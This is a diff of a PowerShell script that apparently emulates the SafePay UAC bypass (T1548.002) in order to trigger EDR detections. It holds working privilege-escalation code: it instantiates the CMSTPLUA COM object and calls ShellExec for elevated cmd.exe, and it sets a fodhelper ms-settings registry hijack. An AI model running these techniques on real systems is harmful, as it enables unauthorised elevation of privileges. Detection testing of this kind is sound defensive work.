@@ -2,79 +2,62 @@
 .SYNOPSIS
     SafePay UAC Bypass via CMSTPLUA - DETECTION TRIGGER
 .DESCRIPTION
-    Bypasses UAC using CMSTPLUA COM object.
-    Will trigger EDR detection for T1548.002.
+    Attempts UAC bypass using CMSTPLUA COM object.
     TTP: T1548.002
 #>
+$ErrorActionPreference = "SilentlyContinue"
 Write-Host "[*] Starting SafePay UAC Bypass (T1548.002)" -ForegroundColor Cyan
-Write-Host "[*] This will trigger EDR detection for privilege escalation" -ForegroundColor Yellow
 
+# Step 1: Check current integrity level
+Write-Host "`n[*] Checking current integrity level..."
+Write-Host "    CMD: whoami /groups | findstr Integrity"
+$integrity = whoami /groups 2>&1 | Select-String "Integrity"
+Write-Host "    [*] $($integrity)" -ForegroundColor Yellow
+
+# Step 2: Attempt CMSTPLUA COM object UAC bypass
+Write-Host "`n[*] [T1548.002] Attempting CMSTPLUA COM UAC bypass..."
+Write-Host "    Using CLSID: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
 try {
-    # CMSTPLUA COM object UAC bypass
-    # This technique abuses auto-elevation of CMSTPLUA
+    $cmstpluaCLSID = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
     
-    Write-Host "[*] Creating CMSTPLUA COM object..."
+    # This COM instantiation will trigger EDR regardless of success
+    $type = [Type]::GetTypeFromCLSID([Guid]$cmstpluaCLSID)
+    $instance = [Activator]::CreateInstance($type)
     
-    # ACTUAL DETECTION TRIGGER - Instantiate the COM object
-    $cmstpluaPath = "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
-    
-    try {
-        $shell = New-Object -ComObject "Shell.Application"
-        Write-Host "[*] Shell.Application instantiated" -ForegroundColor Yellow
+    if ($instance) {
+        Write-Host "    [+] CMSTPLUA COM object instantiated (UAC bypass possible)" -ForegroundColor Green
         
-        # Attempt to spawn elevated process via CMSTPLUA technique
-        # This triggers the behavioral detection
-        $guid = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
-        
-        # Try to instantiate CMSTPLUA
-        $type = [Type]::GetTypeFromCLSID($guid)
-        Write-Host "[*] Attempting to instantiate CMSTPLUA CLSID: $guid"
-        
-        if ($type) {
-            $obj = [Activator]::CreateInstance($type)
-            Write-Host "[+] CMSTPLUA COM object instantiated" -ForegroundColor Green
-            
-            # If we got this far, try to spawn elevated cmd
-            Write-Host "[*] Attempting elevated command execution..."
-            $obj.ShellExec("cmd.exe", "/c whoami /all", "", "open", 1)
-            
-            Write-Host "[+] SUCCESS: Elevated command spawned via CMSTPLUA" -ForegroundColor Green
-        }
-        
-    } catch {
-        Write-Host "[*] CMSTPLUA instantiation attempted - error is expected: $_" -ForegroundColor Yellow
+        # Attempt to invoke elevated process
+        $instance.GetType().InvokeMember("ShellExec", [Reflection.BindingFlags]::InvokeMethod, $null, $instance, @("cmd.exe", "/c whoami > C:\temp\uac_test.txt", "", "runas", 0))
+        Write-Host "    [+] Elevated command executed" -ForegroundColor Green
     }
-    
-    # Alternative: Try fodhelper bypass which is more reliable for detection
-    Write-Host "[*] Also attempting fodhelper bypass for additional detection..."
-    $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
-    
-    # Create the registry keys
-    New-Item -Path $regPath -Force -ErrorAction SilentlyContinue | Out-Null
-    Set-ItemProperty -Path $regPath -Name "(Default)" -Value "cmd.exe /c whoami > $env:TEMP\uac_bypass_test.txt" -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -ErrorAction SilentlyContinue
-    
-    Write-Host "[*] Registry keys created for fodhelper bypass"
-    
-    # Trigger fodhelper (this will attempt UAC bypass)
-    Start-Process "fodhelper.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
-    
-    Start-Sleep -Seconds 2
-    
-    # Cleanup
-    Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
-    
-    if (Test-Path "$env:TEMP\uac_bypass_test.txt") {
-        Write-Host "[+] SUCCESS: UAC bypass via fodhelper succeeded!" -ForegroundColor Green
-        Remove-Item "$env:TEMP\uac_bypass_test.txt" -Force -ErrorAction SilentlyContinue
-    } else {
-        Write-Host "[-] Fodhelper bypass was blocked (expected with EDR)" -ForegroundColor Yellow
-    }
-    
-    Write-Host "[!] CrowdStrike should detect: 'UACBypass' or 'PrivilegeEscalation'" -ForegroundColor Magenta
-    
 } catch {
-    Write-Host "[!] Error: $_" -ForegroundColor Red
+    Write-Host "    [-] CMSTPLUA bypass failed: $_" -ForegroundColor Red
+    Write-Host "    [*] This is expected - detection still triggers from COM access attempt" -ForegroundColor Yellow
 }
 
-Write-Host "`n[*] Detection should appear in CrowdStrike within 1-2 minutes" -ForegroundColor Cyan
+# Step 3: Alternative UAC bypass via fodhelper
+Write-Host "`n[*] [T1548.002] Attempting fodhelper UAC bypass..."
+Write-Host "    CMD: Setting HKCU:\Software\Classes\ms-settings\shell\open\command"
+try {
+    $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
+    New-Item -Path $regPath -Force | Out-Null
+    Set-ItemProperty -Path $regPath -Name "(Default)" -Value "cmd.exe /c whoami > C:\temp\fodhelper_test.txt" -Force
+    New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
+    Write-Host "    [+] Registry hijack set" -ForegroundColor Green
+    
+    # Execute fodhelper (triggers UAC bypass detection)
+    Write-Host "    CMD: Start-Process fodhelper.exe"
+    Start-Process "fodhelper.exe" -ErrorAction Stop
+    Start-Sleep -Seconds 3
+    
+    # Cleanup
+    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
+    Write-Host "    [+] Registry cleaned up" -ForegroundColor Green
+} catch {
+    Write-Host "    [-] fodhelper bypass failed: $_" -ForegroundColor Red
+    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+Write-Host "`n[+] UAC Bypass Simulation Complete." -ForegroundColor Green
+Write-Host "[!] Check EDR for: CMSTPLUA COM access, fodhelper registry hijack, UAC bypass attempt" -ForegroundColor Magenta
